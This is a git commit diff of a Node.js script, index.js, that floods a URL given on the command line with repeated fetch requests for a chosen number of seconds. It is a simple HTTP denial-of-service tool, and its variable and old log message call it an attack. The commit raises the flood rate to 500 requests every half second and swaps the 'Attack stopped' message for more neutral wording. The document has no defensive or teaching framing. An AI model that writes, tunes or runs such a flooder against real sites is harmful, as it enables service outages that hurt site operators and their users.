095793837ff5adc02b1c16aea8d9110362ae8fcf
Heru Dev <162998538+Heruteah@users.noreply.github.com>
2025-01-14 17:52:41 +0000

    Hi

--- index.js
+++ index.js
@@ -1,20 +1,20 @@
 const target = process.argv[2];
 const duration = process.argv[3];
+const requestsPerInterval = 500;
 
 if (process.argv.length < 4 || isNaN(parseInt(duration))) {
-    console.log('Invalid Usage: node index.js <link target> <duration is second>');
-    process.exit(1)
+    console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
+    process.exit(1);
 } else {
     const attackInterval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
+        for (let i = 0; i < requestsPerInterval; i++) {
             fetch(target).catch(error => {});
         }
-        
-    });
+    }, 500);
 
     setTimeout(() => {
         clearInterval(attackInterval);
-        console.log('Attack stopped.');
+        console.log('Request sending stopped.');
         process.exit(0);
     }, duration * 1000);
 }
